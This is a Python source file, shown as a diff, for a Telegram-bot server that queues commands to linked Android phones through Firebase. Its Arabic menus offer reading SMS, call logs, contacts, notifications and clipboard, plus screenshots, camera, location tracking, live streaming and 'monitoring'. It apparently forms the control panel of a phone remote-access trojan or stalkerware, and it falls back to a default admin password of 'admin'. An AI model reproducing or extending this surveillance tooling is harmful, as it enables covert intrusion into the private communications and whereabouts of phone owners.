@@ -1,0 +1,1003 @@
+     1→   500→
+     2→   501→async def remove_device(device_id):
+     3→   502→    async with _db_lock:
+     4→   503→        devices = get_devices()
+     5→   504→        new_devices = [d for d in devices if d.get("id") != device_id]
+     6→   505→        if len(new_devices) == len(devices):
+     7→   506→            return False
+     8→   507→        save_devices(new_devices)
+     9→   508→        append_event("Device removed", {"id": device_id})
+    10→   509→        return True
+    11→   510→
+    12→   511→
+    13→   512→def get_first_device():
+    14→   513→    devices = get_devices()
+    15→   514→    return devices[0] if devices else None
+    16→   515→
+    17→   516→
+    18→   517→def get_device_by_token(device_id, token):
+    19→   518→    """Look up a device by both its ID and token. Returns device dict or None."""
+    20→   519→    devices = load_json(DEVICES_FILE, [])
+    21→   520→    for d in devices:
+    22→   521→        if d.get('id') == device_id and d.get('token') == token:
+    23→   522→            return d
+    24→   523→    return None
+    25→   524→
+    26→   525→# ============================================================================
+    27→   526→# COMMAND QUEUE HELPERS
+    28→   527→# ============================================================================
+    29→   528→
+    30→   529→async def queue_command(device_id, command, params=None):
+    31→   530→    async with _db_lock:
+    32→   531→        commands = load_json(COMMANDS_FILE, [])
+    33→   532→        cmd = {
+    34→   533→            "id": str(uuid.uuid4())[:8],
+    35→   534→            "device_id": device_id,
+    36→   535→            "command": command,
+    37→   536→            "params": params or {},
+    38→   537→            "status": "pending",
+    39→   538→            "created_at": ts(),
+    40→   539→            "sent_at": None,
+    41→   540→            "result": None,
+    42→   541→        }
+    43→   542→        commands.append(cmd)
+    44→   543→        if len(commands) > 1000:
+    45→   544→            commands = commands[-1000:]
+    46→   545→        save_json(COMMANDS_FILE, commands)
+    47→   546→        append_event("Command queued", {"device_id": device_id, "command": command, "cmd_id": cmd["id"]})
+    48→   547→        firebase_push_command(cmd)
+    49→   548→        return cmd
+    50→   549→
+    51→   550→
+    52→   551→def get_pending_commands(device_id):
+    53→   552→    commands = load_json(COMMANDS_FILE, [])
+    54→   553→    return [c for c in commands if c.get("device_id") == device_id and c.get("status") == "pending"]
+    55→   554→
+    56→   555→
+    57→   556→async def update_command_status(cmd_id, status, result=None):
+    58→   557→    async with _db_lock:
+    59→   558→        commands = load_json(COMMANDS_FILE, [])
+    60→   559→        for i, c in enumerate(commands):
+    61→   560→            if c.get("id") == cmd_id:
+    62→   561→                commands[i]["status"] = status
+    63→   562→                commands[i]["result"] = result
+    64→   563→                commands[i]["completed_at"] = ts()
+    65→   564→                save_json(COMMANDS_FILE, commands)
+    66→   565→                return commands[i]
+    67→   566→        return None
+    68→   567→
+    69→   568→# ============================================================================
+    70→   569→# SESSION HELPERS
+    71→   570→# ============================================================================
+    72→   571→
+    73→   572→async def create_session(username, password, ip="", ua=""):
+    74→   573→    async with _db_lock:
+    75→   574→        settings = load_settings()
+    76→   575→        if not hmac.compare_digest(password, settings.get("admin_password", "admin")):
+    77→   576→            return None
+    78→   577→        # Clean expired sessions first
+    79→   578→        sessions = load_json(SESSIONS_FILE, [])
+    80→   579→        now = datetime.now(timezone.utc)
+    81→   580→        active = []
+    82→   581→        for s in sessions:
+    83→   582→            try:
+    84→   583→                if now < datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc):
+    85→   584→                    active.append(s)
+    86→   585→            except Exception:
+    87→   586→                continue
+    88→   587→        sessions = active
+    89→   588→        token = secrets.token_urlsafe(32)
+    90→   589→        session = {
+    91→   590→            "token": token,
+    92→   591→            "username": username,
+    93→   592→            "created_at": now.isoformat(),
+    94→   593→            "expires_at": (now + timedelta(hours=24)).isoformat(),
+    95→   594→            "ip": ip,
+    96→   595→            "user_agent": ua,
+    97→   596→        }
+    98→   597→        sessions.append(session)
+    99→   598→        if len(sessions) > 50:
+   100→   599→            sessions = sessions[-50:]
+   101→   600→        save_json(SESSIONS_FILE, sessions)
+   102→   601→        append_event("Web login", {"username": username, "ip": ip})
+   103→   602→        return session
+   104→   603→
+   105→   604→
+   106→   605→def validate_session(token):
+   107→   606→    sessions = load_json(SESSIONS_FILE, [])
+   108→   607→    now = datetime.now(timezone.utc)
+   109→   608→    for s in sessions:
+   110→   609→        if s.get("token") == token:
+   111→   610→            try:
+   112→   611→                expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
+   113→   612→                if now > expires:
+   114→   613→                    return None
+   115→   614→            except Exception:
+   116→   615→                return None
+   117→   616→            return s
+   118→   617→    return None
+   119→   618→
+   120→   619→
+   121→   620→async def delete_session(token):
+   122→   621→    async with _db_lock:
+   123→   622→        sessions = load_json(SESSIONS_FILE, [])
+   124→   623→        new_sessions = [s for s in sessions if s.get("token") != token]
+   125→   624→        save_json(SESSIONS_FILE, new_sessions)
+   126→   625→
+   127→   626→# ============================================================================
+   128→   627→# LINK CODE HELPERS (Firebase Realtime Database + Local)
+   129→   628→# ============================================================================
+   130→   629→
+   131→   630→async def check_firebase_connectivity():
+   132→   631→    """Test Firebase connectivity and set global firebase_connected flag."""
+   133→   632→    global firebase_connected
+   134→   633→    if not FIREBASE_DB_SECRET:
+   135→   634→        log.warning("FIREBASE_DB_SECRET is empty - Firebase operations will use public access rules only")
+   136→   635→    try:
+   137→   636→        session = get_tg_session()
+   138→   637→        url = f"{FIREBASE_RTDB_URL}/.json"
+   139→   638→        if FIREBASE_DB_SECRET:
+   140→   639→            url += f"?auth={FIREBASE_DB_SECRET}"
+   141→   640→        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+   142→   641→            if resp.status == 200:
+   143→   642→                firebase_connected = True
+   144→   643→                log.info("Firebase connectivity check: OK (status=200)")
+   145→   644→            else:
+   146→   645→                firebase_connected = False
+   147→   646→                log.warning("Firebase connectivity check: FAIL (status=%d)", resp.status)
+   148→   647→    except Exception as exc:
+   149→   648→        firebase_connected = False
+   150→   649→        log.warning("Firebase connectivity check: UNREACHABLE (%s)", exc)
+   151→   650→    return firebase_connected
+   152→   651→
+   153→   652→
+   154→   653→async def firebase_get(path):
+   155→   654→    """GET data from Firebase RTDB.
+   156→   655→    يعمل بدون مصادقة إذا كانت القواعد تسمح بالوصول العام.
+   157→   656→    أو مع Database Secret إذا تم تعيين FIREBASE_DB_SECRET.
+   158→   657→    Gracefully returns None if Firebase is unavailable."""
+   159→   658→    try:
+   160→   659→        url = f"{FIREBASE_RTDB_URL}/{path}.json"
+   161→   660→        if FIREBASE_DB_SECRET:
+   162→   661→            url += f"?auth={FIREBASE_DB_SECRET}"
+   163→   662→        session = get_tg_session()
+   164→   663→        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+   165→   664→            if resp.status == 200:
+   166→   665→                data = await resp.json()
+   167→   666→                log.debug("Firebase GET %s OK", path)
+   168→   667→                return data
+   169→   668→            else:
+   170→   669→                log.warning("Firebase GET %s returned status %d", path, resp.status)
+   171→   670→    except Exception as exc:
+   172→   671→        log.error("Firebase GET %s failed: %s", path, exc)
+   173→   672→    return None
+   174→   673→
+   175→   674→
+   176→   675→async def firebase_set(path, data):
+   177→   676→    """SET data in Firebase RTDB - with optional Database Secret auth.
+   178→   677→    If data is None, uses DELETE instead of PUT (to properly remove the key).
+   179→   678→    Gracefully returns False if Firebase is unavailable."""
+   180→   679→    try:
+   181→   680→        url = f"{FIREBASE_RTDB_URL}/{path}.json"
+   182→   681→        if FIREBASE_DB_SECRET:
+   183→   682→            url += f"?auth={FIREBASE_DB_SECRET}"
+   184→   683→        session = get_tg_session()
+   185→   684→        if data is None:
+   186→   685→            # حذف المسار بدلاً من تعيينه إلى null
+   187→   686→            async with session.delete(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+   188→   687→                ok = resp.status in (200, 204)
+   189→   688→                if not ok:
+   190→   689→                    body = await resp.text()
+   191→   690→                    log.warning("Firebase DELETE %s failed: status=%d body=%s", path, resp.status, body[:200])
+   192→   691→                return ok
+   193→   692→        else:
+   194→   693→            async with session.put(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+   195→   694→                ok = resp.status in (200, 204)
+   196→   695→                if ok:
+   197→   696→                    log.debug("Firebase SET %s OK", path)
+   198→   697→                else:
+   199→   698→                    body = await resp.text()
+   200→   699→                    log.warning("Firebase SET %s failed: status=%d body=%s", path, resp.status, body[:200])
+   201→   700→                return ok
+   202→   701→    except Exception as exc:
+   203→   702→        log.error("Firebase SET %s failed: %s", path, exc)
+   204→   703→        return False
+   205→   704→
+   206→   705→
+   207→   706→async def firebase_update(path, data):
+   208→   707→    """PATCH (partial update) data in Firebase RTDB - with optional Database Secret auth.
+   209→   708→    Gracefully returns False if Firebase is unavailable."""
+   210→   709→    try:
+   211→   710→        url = f"{FIREBASE_RTDB_URL}/{path}.json"
+   212→   711→        if FIREBASE_DB_SECRET:
+   213→   712→            url += f"?auth={FIREBASE_DB_SECRET}"
+   214→   713→        session = get_tg_session()
+   215→   714→        async with session.patch(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+   216→   715→            ok = resp.status in (200, 204)
+   217→   716→            if ok:
+   218→   717→                log.debug("Firebase UPDATE %s OK", path)
+   219→   718→            else:
+   220→   719→                body = await resp.text()
+   221→   720→                log.warning("Firebase UPDATE %s failed: status=%d body=%s", path, resp.status, body[:200])
+   222→   721→            return ok
+   223→   722→    except Exception as exc:
+   224→   723→        log.error("Firebase UPDATE %s failed: %s", path, exc)
+   225→   724→        return False
+   226→   725→
+   227→   726→
+   228→   727→def validate_id(id_str, name="ID"):
+   229→   728→    """Validate that an ID contains only safe characters to prevent path injection."""
+   230→   729→    if not id_str or not all(c.isalnum() or c in '-_' for c in str(id_str)):
+   231→   730→        raise ValueError(f"Invalid {name}: {id_str}")
+   232→   731→
+   233→   732→
+   234→   733→def firebase_push_command(cmd):
+   235→   734→    """Push command to Firebase so the Android app can receive it."""
+   236→   735→    try:
+   237→   736→        loop = asyncio.get_running_loop()
+   238→   737→        loop.create_task(_firebase_push_cmd_async(cmd))
+   239→   738→    except RuntimeError:
+   240→   739→        # Not in async context, log warning
+   241→   740→        log.warning("firebase_push_command called outside async context")
+   242→   741→
+   243→   742→
+   244→   743→async def _firebase_push_cmd_async(cmd):
+   245→   744→    """Async: Push command to Firebase /commands/{device_id}/{cmd_id}"""
+   246→   745→    device_id = cmd.get("device_id", "")
+   247→   746→    cmd_id = cmd.get("id", "")
+   248→   747→    if not device_id or not cmd_id:
+   249→   748→        return
+   250→   749→    try:
+   251→   750→        validate_id(device_id, "device_id")
+   252→   751→        validate_id(cmd_id, "cmd_id")
+   253→   752→        ok = await firebase_set(f"commands/{device_id}/{cmd_id}", {
+   254→   753→            "id": cmd["id"],
+   255→   754→            "device_id": cmd["device_id"],
+   256→   755→            "command": cmd["command"],
+   257→   756→            "params": cmd.get("params", {}),
+   258→   757→            "status": "pending",
+   259→   758→            "created_at": cmd["created_at"],
+   260→   759→            "server_domain": SERVER_DOMAIN,
+   261→   760→            "server_port": SERVER_PORT,
+   262→   761→        })
+   263→   762→        if ok:
+   264→   763→            log.info("Firebase: Command %s pushed for device %s", cmd_id, device_id)
+   265→   764→            # Schedule deletion after 60 seconds (app polls every 10s, gives plenty of time)
+   266→   765→            async def _delayed_delete():
+   267→   766→                await asyncio.sleep(60)
+   268→   767→                try:
+   269→   768→                    await firebase_set(f"commands/{device_id}/{cmd_id}", None)
+   270→   769→                    log.info("Firebase: Command %s auto-deleted after timeout", cmd_id)
+   271→   770→                except Exception:
+   272→   771→                    pass
+   273→   772→            asyncio.ensure_future(_delayed_delete())
+   274→   773→        else:
+   275→   774→            log.warning("Firebase: Failed to push command %s", cmd_id)
+   276→   775→    except Exception as exc:
+   277→   776→        log.error("Firebase push command error: %s", exc)
+   278→   777→
+   279→   778→
+   280→   779→async def generate_link_code():
+   281→   780→    """Generate a lifetime link code - saved to Firebase + local backup.
+   282→   781→    كود مدى الحياة - لربط جهاز واحد فقط - متزامن مع Firebase."""
+   283→   782→    code = secrets.token_urlsafe(6).upper()[:8]
+   284→   783→    now = datetime.now(timezone.utc)
+   285→   784→    entry = {
+   286→   785→        "code": code,
+   287→   786→        "created_at": now.isoformat(),
+   288→   787→        "used": False,
+   289→   788→        "device_id": None,
+   290→   789→        "session_id": secrets.token_urlsafe(16),
+   291→   790→    }
+   292→   791→    # 1. حفظ محلياً (ك.backup)
+   293→   792→    codes = load_json(LINK_CODES_FILE, [])
+   294→   793→    codes.append(entry)
+   295→   794→    if len(codes) > 500:
+   296→   795→        codes = codes[-200:]
+   297→   796→    save_json(LINK_CODES_FILE, codes)
+   298→   797→    append_event("Link code generated", {"code": code})
+   299→   798→    # 2. حفظ في Firebase (انتظار التأكيد)
+   300→   799→    fb_ok = await firebase_set(f"link_codes/{code}", entry)
+   301→   800→    if fb_ok:
+   302→   801→        log.info("تم حفظ كود الربط %s في Firebase", code)
+   303→   802→    else:
+   304→   803→        log.warning("لم يتم حفظ كود الربط %s في Firebase - محفوظ محلياً فقط", code)
+   305→   804→    return entry
+   306→   805→
+   307→   806→
+   308→   807→async def verify_link_code(code):
+   309→   808→    """Verify link code - checks Firebase first, then local fallback."""
+   310→   809→    # 1. التحقق من Firebase
+   311→   810→    fb_data = await firebase_get(f"link_codes/{code}")
+   312→   811→    if fb_data is not None:
+   313→   812→        if fb_data.get("used"):
+   314→   813→            return {"ok": False, "error": "Code already used"}
+   315→   814→        return {"ok": True, "code_entry": fb_data}
+   316→   815→    # 2. التحقق من الملف المحلي
+   317→   816→    codes = load_json(LINK_CODES_FILE, [])
+   318→   817→    for entry in codes:
+   319→   818→        if entry.get("code") == code:
+   320→   819→            if entry.get("used"):
+   321→   820→                return {"ok": False, "error": "Code already used"}
+   322→   821→            return {"ok": True, "code_entry": entry}
+   323→   822→    return {"ok": False, "error": "Invalid code"}
+   324→   823→
+   325→   824→
+   326→   825→async def consume_link_code(code, device_id):
+   327→   826→    """Mark link code as used in Firebase + local."""
+   328→   827→    now = datetime.now(timezone.utc).isoformat()
+   329→   828→    # 1. تحديث Firebase
+   330→   829→    await firebase_update(f"link_codes/{code}", {
+   331→   830→        "used": True,
+   332→   831→        "device_id": device_id,
+   333→   832→        "used_at": now,
+   334→   833→    })
+   335→   834→    # 2. تحديث محلي
+   336→   835→    codes = load_json(LINK_CODES_FILE, [])
+   337→   836→    for entry in codes:
+   338→   837→        if entry.get("code") == code:
+   339→   838→            entry["used"] = True
+   340→   839→            entry["device_id"] = device_id
+   341→   840→            entry["used_at"] = now
+   342→   841→            save_json(LINK_CODES_FILE, codes)
+   343→   842→            return True
+   344→   843→    return False
+   345→   844→
+   346→   845→# ============================================================================
+   347→   846→# TELEGRAM API HELPERS (aiohttp only)
+   348→   847→# ============================================================================
+   349→   848→
+   350→   849→def get_tg_session():
+   351→   850→    global _tg_session
+   352→   851→    if _tg_session is None or _tg_session.closed:
+   353→   852→        _tg_session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
+   354→   853→    return _tg_session
+   355→   854→
+   356→   855→
+   357→   856→async def tg_request(method, payload=None):
+   358→   857→    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+   359→   858→    try:
+   360→   859→        session = get_tg_session()
+   361→   860→        async with session.post(url, json=payload or {}) as resp:
+   362→   861→            data = await resp.json()
+   363→   862→            if not data.get("ok"):
+   364→   863→                log.warning("TG %s error: %s", method, data.get("description", ""))
+   365→   864→            return data
+   366→   865→    except Exception as exc:
+   367→   866→        log.error("TG %s failed: %s", method, exc)
+   368→   867→        return None
+   369→   868→
+   370→   869→
+   371→   870→async def send_message(chat_id, text, parse_mode="HTML", reply_markup=None, disable_notification=False):
+   372→   871→    global messages_sent
+   373→   872→    # === ANTI-SPAM: Deduplication + Rate Limiting ===
+   374→   873→    now = time.time()
+   375→   874→    chat_key = str(chat_id)
+   376→   875→    text_hash = hashlib.md5(text[:200].encode()).hexdigest() if text else ""
+   377→   876→
+   378→   877→    # Check: same message to same chat within 60 seconds?
+   379→   878→    dedup_key = f"{chat_key}:{text_hash}"
+   380→   879→    last_sent = _message_dedup.get(dedup_key, 0)
+   381→   880→    if now - last_sent < 10 and text_hash:
+   382→   881→        log.warning("DEDUP BLOCKED: chat=%s hash=%s", chat_key, text_hash[:8])
+   383→   882→        return {"ok": False, "description": "dedup_blocked"}
+   384→   883→
+   385→   884→    # Check: more than 5 messages to same chat within 30 seconds?
+   386→   885→    recent = _chat_rate_counter.get(chat_key, [])
+   387→   886→    recent = [t for t in recent if now - t < 30]
+   388→   887→    if len(recent) >= 10:
+   389→   888→        log.warning("RATE BLOCKED: chat=%s count=%d", chat_key, len(recent))
+   390→   889→        return {"ok": False, "description": "rate_limited"}
+   391→   890→    recent.append(now)
+   392→   891→    _chat_rate_counter[chat_key] = recent
+   393→   892→
+   394→   893→    # Register in dedup table
+   395→   894→    _message_dedup[dedup_key] = now
+   396→   895→    expired = [k for k, v in _message_dedup.items() if now - v > 30]
+   397→   896→    for k in expired:
+   398→   897→        del _message_dedup[k]
+   399→   898→
+   400→   899→    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
+   401→   900→    if reply_markup:
+   402→   901→        payload["reply_markup"] = reply_markup
+   403→   902→    if disable_notification:
+   404→   903→        payload["disable_notification"] = True
+   405→   904→    result = await tg_request("sendMessage", payload)
+   406→   905→    if result and result.get("ok"):
+   407→   906→        messages_sent += 1
+   408→   907→    return result
+   409→   908→
+   410→   909→
+   411→   910→async def send_admin(text, parse_mode="HTML", reply_markup=None):
+   412→   911→    return await send_message(ADMIN_CHAT_ID, text, parse_mode, reply_markup)
+   413→   912→
+   414→   913→
+   415→   914→async def send_photo(chat_id, file_data, caption=None):
+   416→   915→    session = get_tg_session()
+   417→   916→    try:
+   418→   917→        data = aiohttp.FormData()
+   419→   918→        data.add_field("chat_id", str(chat_id))
+   420→   919→        data.add_field("photo", file_data, filename="data.jpg")
+   421→   920→        if caption:
+   422→   921→            data.add_field("caption", caption)
+   423→   922→        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data) as resp:
+   424→   923→            return await resp.json()
+   425→   924→    except Exception as exc:
+   426→   925→        log.error("send_photo failed: %s", exc)
+   427→   926→        return None
+   428→   927→
+   429→   928→
+   430→   929→async def answer_callback_query(callback_query_id, text="", show_alert=False):
+   431→   930→    return await tg_request("answerCallbackQuery", {
+   432→   931→        "callback_query_id": callback_query_id,
+   433→   932→        "text": text,
+   434→   933→        "show_alert": show_alert,
+   435→   934→    })
+   436→   935→
+   437→   936→
+   438→   937→async def edit_message_text(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
+   439→   938→    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
+   440→   939→    if reply_markup:
+   441→   940→        payload["reply_markup"] = reply_markup
+   442→   941→    return await tg_request("editMessageText", payload)
+   443→   942→
+   444→   943→
+   445→   944→async def update_batch_progress(batch_id):
+   446→   945→    """Update batch operation progress message in Telegram."""
+   447→   946→    batch = _batch_operations.get(batch_id)
+   448→   947→    if not batch or not batch.get("msg_id"):
+   449→   948→        return
+   450→   949→    elapsed = int(time.time() - batch.get("created_at", time.time()))
+   451→   950→    total = batch["total"]
+   452→   951→    responded = batch["responded"]
+   453→   952→    icon = "✅" if responded >= total else "⏳"
+   454→   953→    btype = "📢 إرسال عام" if batch.get("type") == "broadcast" else "🔄 أمر جماعي"
+   455→   954→    text = (
+   456→   955→        f"{icon} <b>{btype}</b>\n\n"
+   457→   956→        f"📊 التقدم: <b>{responded}/{total}</b> أجهزة استجابت\n"
+   458→   957→        f"⏱️ الوقت: {elapsed} ثانية"
+   459→   958→    )
+   460→   959→    if responded >= total:
+   461→   960→        text += f"\n\n✅ تم الانتهاء!"
+   462→   961→    try:
+   463→   962→        await edit_message_text(batch["chat_id"], batch["msg_id"], text)
+   464→   963→    except Exception as e:
+   465→   964→        log.warning("Failed to update batch progress: %s", e)
+   466→   965→
+   467→   966→# ============================================================================
+   468→   967→# INLINE KEYBOARD BUILDERS
+   469→   968→# ============================================================================
+   470→   969→
+   471→   970→def ib(text, callback_data):
+   472→   971→    return {"text": text, "callback_data": callback_data}
+   473→   972→
+   474→   973→
+   475→   974→def build_main_menu():
+   476→   975→    return {
+   477→   976→        "inline_keyboard": [
+   478→   977→            [ib("📱 الأجهزة والربط", "menu_devices")],
+   479→   978→            [ib("📊 جمع البيانات", "menu_data")],
+   480→   979→            [ib("🌐 التواصل الاجتماعي", "menu_social")],
+   481→   980→            [ib("🎮 التحكم عن بعد", "menu_control")],
+   482→   981→            [ib("📦 إدارة التطبيقات", "menu_apps")],
+   483→   982→            [ib("📂 إدارة الملفات", "menu_files")],
+   484→   983→            [ib("🔒 الأمان والإدارة", "menu_security")],
+   485→   984→            [ib("🔍 المراقبة", "menu_monitor")],
+   486→   985→            [ib("📡 البث المباشر", "menu_streaming")],
+   487→   986→            [ib("⚙️ إعدادات النظام", "menu_syssettings")],
+   488→   987→            [ib("🖥️ إدارة السيرفر", "menu_server")],
+   489→   988→            [ib("⁉️ المساعدة", "menu_help")],
+   490→   989→        ]
+   491→   990→    }
+   492→   991→
+   493→   992→
+   494→   993→def build_back_button(target="back_main"):
+   495→   994→    return {"inline_keyboard": [[ib("🔙 رجوع", target)]]}
+   496→   995→
+   497→   996→
+   498→   997→def check_user_rate_limit(chat_id):
+   499→   998→    """Check if user is within rate limit. Returns True if allowed, False if rate limited."""
+   500→   999→    now = time.time()
+   501→  1000→    chat_key = str(chat_id)
+   502→  1001→    timestamps = _user_command_timestamps.get(chat_key, [])
+   503→  1002→    # Remove timestamps outside the window
+   504→  1003→    timestamps = [t for t in timestamps if now - t < USER_RATE_LIMIT_WINDOW]
+   505→  1004→    if len(timestamps) >= USER_RATE_LIMIT_MAX:
+   506→  1005→        _user_command_timestamps[chat_key] = timestamps
+   507→  1006→        return False
+   508→  1007→    timestamps.append(now)
+   509→  1008→    _user_command_timestamps[chat_key] = timestamps
+   510→  1009→    # Periodic cleanup
+   511→  1010→    if len(timestamps) == 1:
+   512→  1011→        expired_keys = [k for k, v in _user_command_timestamps.items() if not v or now - v[-1] > USER_RATE_LIMIT_WINDOW * 2]
+   513→  1012→        for k in expired_keys:
+   514→  1013→            del _user_command_timestamps[k]
+   515→  1014→    return True
+   516→  1015→
+   517→  1016→
+   518→  1017→def build_quick_actions_menu(device_id):
+   519→  1018→    """Build inline keyboard with quick action buttons for a device."""
+   520→  1019→    return {
+   521→  1020→        "inline_keyboard": [
+   522→  1021→            [ib("📸 لقطة شاشة", f"quick_screenshot_{device_id}"), ib("📍 الموقع", f"quick_location_{device_id}")],
+   523→  1022→            [ib("🔋 البطارية", f"quick_battery_{device_id}"), ib("ℹ️ معلومات الجهاز", f"quick_info_{device_id}")],
+   524→  1023→            [ib("📱 التطبيقات", f"quick_apps_{device_id}")],
+   525→  1024→            [ib("🔙 رجوع", f"dev_{device_id}")],
+   526→  1025→        ]
+   527→  1026→    }
+   528→  1027→
+   529→  1028→
+   530→  1029→def build_devices_menu():
+   531→  1030→    devices = get_devices()
+   532→  1031→    rows = []
+   533→  1032→    for d in devices:
+   534→  1033→        status = "🟢" if d.get("active") else "🔴"
+   535→  1034→        name = d.get("name", d.get("id", "مجهول"))
+   536→  1035→        rows.append([ib(f"{status} {name}", f"dev_{d['id']}")])
+   537→  1036→    if not devices:
+   538→  1037→        rows.append([ib("لا توجد أجهزة مربوطة", "no_action")])
+   539→  1038→    rows.append([ib("🔗 ربط جهاز جديد", "do_link")])
+   540→  1039→    rows.append([ib("🔙 رجوع", "back_main")])
+   541→  1040→    return {"inline_keyboard": rows}
+   542→  1041→
+   543→  1042→
+   544→  1043→def build_device_menu(device_id):
+   545→  1044→    return {
+   546→  1045→        "inline_keyboard": [
+   547→  1046→            [ib("⚡ إجراءات سريعة", f"quick_actions_{device_id}")],
+   548→  1047→            [ib("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
+   549→  1048→            [ib("🔋 البطارية", f"cmd_battery_{device_id}"), ib("📍 الموقع", f"cmd_location_{device_id}")],
+   550→  1049→            [ib("📲 الرسائل", f"cmd_sms_{device_id}"), ib("📞 المكالمات", f"cmd_calls_{device_id}")],
+   551→  1050→            [ib("📇 جهات الاتصال", f"cmd_contacts_{device_id}"), ib("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
+   552→  1051→            [ib("📸 لقطة الشاشة", f"cmd_screenshot_{device_id}"), ib("📷 الكاميرا", f"submenu_camera_{device_id}")],
+   553→  1052→            [ib("📋 الحافظة", f"cmd_clipboard_{device_id}"), ib("📱 التطبيقات", f"cmd_apps_{device_id}")],
+   554→  1053→            [ib("🌐 التواصل", f"submenu_social_{device_id}")],
+   555→  1054→            [ib("🎮 التحكم", f"submenu_control_{device_id}")],
+   556→  1055→            [ib("📂 الملفات", f"submenu_files_{device_id}")],
+   557→  1056→            [ib("🔒 الأمان", f"submenu_security_{device_id}")],
+   558→  1057→            [ib("🔍 المراقبة", f"submenu_monitor_{device_id}")],
+   559→  1058→            [ib("📡 البث المباشر", f"submenu_streaming_{device_id}")],
+   560→  1059→            [ib("⚙️ الإعدادات", f"submenu_syssettings_{device_id}")],
+   561→  1060→            [ib("🗑️ إلغاء الربط", f"do_unlink_{device_id}")],
+   562→  1061→            [ib("🔙 رجوع", "menu_devices")],
+   563→  1062→        ]
+   564→  1063→    }
+   565→  1064→
+   566→  1065→
+   567→  1066→def build_category_submenu(device_id, category):
+   568→  1067→    """Build submenu for a command category with 2-column grid."""
+   569→  1068→    items = []
+   570→  1069→    for name, info in COMMAND_REGISTRY.items():
+   571→  1070→        if info["cat"] == category:
+   572→  1071→            items.append((name, info))
+   573→  1072→    
+   574→  1073→    if not items:
+   575→  1074→        return build_back_button(f"dev_{device_id}")
+   576→  1075→    
+   577→  1076→    rows = []
+   578→  1077→    # Display in 2-column grid for cleaner layout
+   579→  1078→    for i in range(0, len(items), 2):
+   580→  1079→        row = [ib(items[i][1]["desc"], f"exec_{items[i][0]}_{device_id}")]
+   581→  1080→        if i + 1 < len(items):
+   582→  1081→            row.append(ib(items[i+1][1]["desc"], f"exec_{items[i+1][0]}_{device_id}"))
+   583→  1082→        rows.append(row)
+   584→  1083→    
+   585→  1084→    rows.append([ib("🔙 رجوع", f"dev_{device_id}")])
+   586→  1085→    return {"inline_keyboard": rows}
+   587→  1086→
+   588→  1087→
+   589→  1088→def build_data_submenu(device_id):
+   590→  1089→    return build_category_submenu(device_id, "data")
+   591→  1090→
+   592→  1091→
+   593→  1092→def build_social_submenu(device_id):
+   594→  1093→    return build_category_submenu(device_id, "social")
+   595→  1094→
+   596→  1095→
+   597→  1096→def build_control_submenu(device_id):
+   598→  1097→    return build_category_submenu(device_id, "control")
+   599→  1098→
+   600→  1099→
+   601→  1100→def build_apps_submenu(device_id):
+   602→  1101→    return build_category_submenu(device_id, "apps")
+   603→  1102→
+   604→  1103→
+   605→  1104→def build_files_submenu(device_id):
+   606→  1105→    return build_category_submenu(device_id, "files")
+   607→  1106→
+   608→  1107→
+   609→  1108→def build_security_submenu(device_id):
+   610→  1109→    return build_category_submenu(device_id, "security")
+   611→  1110→
+   612→  1111→
+   613→  1112→def build_monitor_submenu(device_id):
+   614→  1113→    return build_category_submenu(device_id, "monitor")
+   615→  1114→
+   616→  1115→
+   617→  1116→def build_syssettings_submenu(device_id):
+   618→  1117→    return build_category_submenu(device_id, "syssettings")
+   619→  1118→
+   620→  1119→
+   621→  1120→def build_streaming_submenu(device_id):
+   622→  1121→    return build_category_submenu(device_id, "streaming")
+   623→  1122→
+   624→  1123→
+   625→  1124→def build_server_menu():
+   626→  1125→    return {
+   627→  1126→        "inline_keyboard": [
+   628→  1127→            [ib("📊 حالة السيرفر", "srv_status")],
+   629→  1128→            [ib("📈 الإحصائيات", "srv_stats")],
+   630→  1129→            [ib("📝 سجل الأحداث", "srv_logs")],
+   631→  1130→            [ib("⚙️ الإعدادات", "srv_settings")],
+   632→  1131→            [ib("🔑 تغيير كلمة المرور", "srv_setpass")],
+   633→  1132→            [ib("➕ إضافة أدمن", "srv_addadmin")],
+   634→  1133→            [ib("📢 إرسال عام", "srv_broadcast")],
+   635→  1134→            [ib("💾 نسخ احتياطي", "srv_backup")],
+   636→  1135→            [ib("📤 تصدير", "srv_export")],
+   637→  1136→            [ib("📥 استيراد", "srv_import")],
+   638→  1137→            [ib("🗑️ مسح البيانات", "srv_cleardata")],
+   639→  1138→            [ib("🔄 إعادة تشغيل", "srv_restart")],
+   640→  1139→            [ib("🔧 الصيانة", "srv_maintenance")],
+   641→  1140→            [ib("🔙 رجوع", "back_main")],
+   642→  1141→        ]
+   643→  1142→    }
+   644→  1143→
+   645→  1144→
+   646→  1145→def build_help_menu():
+   647→  1146→    total = len(COMMAND_REGISTRY)
+   648→  1147→    cats = OrderedDict()
+   649→  1148→    for name, info in COMMAND_REGISTRY.items():
+   650→  1149→        cat = info["cat"]
+   651→  1150→        if cat not in cats:
+   652→  1151→            cats[cat] = []
+   653→  1152→        cats[cat].append(info)
+   654→  1153→    
+   655→  1154→    text = f"📖 <b>دليل الأوامر - أبو الزهراء</b>\n\nالإجمالي: <b>{total}</b> أوامر\n\n"
+   656→  1155→    cat_names = {
+   657→  1156→        "data": "📊 جمع البيانات", "social": "🌐 التواصل الاجتماعي",
+   658→  1157→        "control": "🎮 التحكم عن بعد", "apps": "📦 إدارة التطبيقات",
+   659→  1158→        "files": "📂 إدارة الملفات", "security": "🔒 الأمان",
+   660→  1159→        "monitor": "🔍 المراقبة", "syssettings": "⚙️ إعدادات النظام",
+   661→  1160→        "streaming": "📡 البث المباشر",
+   662→  1161→    }
+   663→  1162→    for cat, items in cats.items():
+   664→  1163→        text += f"<b>{cat_names.get(cat, cat)}</b> ({len(items)}):\n"
